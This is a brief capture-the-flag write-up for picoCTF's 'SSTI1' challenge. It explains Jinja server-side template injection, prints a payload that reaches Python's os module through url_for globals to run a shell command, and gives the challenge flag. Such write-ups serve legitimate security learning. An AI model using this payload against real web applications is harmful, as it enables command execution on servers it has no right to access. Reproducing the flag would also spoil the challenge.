# 1. SSTI1

> I made a cool website where you can announce whatever you want! Try it out! Additional details will be available after launching your challenge instance.
> The challenge demanded that I make use of a server-side template injection attack to display the flag on the screen. 

## Solution:
I made use of the fact that I could write into the template of the website using `{{}}` and the server would return whatever changes I made (respond to the change)
then, I injected the following line into the dialog box.

```
{{url_for.__globals__.os.popen("cat flag").read()}}
```

## Flag:

```
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_09365533}
```

## Concepts learnt:

- **Templates** : Some webpages have dynamic mutable elements that can be changed, they are present in `{{}}`(this depends on syntax, Jinja usese `{{}}`)
- **Template Injections** - When user inputs in templates can be manipulated/tampered with to get data.
- In order to interact with the shell, we need to get into the os module, i.e. find a path to it and then execute whatever we want.
- `url_for` helps in locating any python function(which contaings `import os`)

## Notes:

- The challenge also could be solved using `curl` first to check the vulnerability and then to inject.
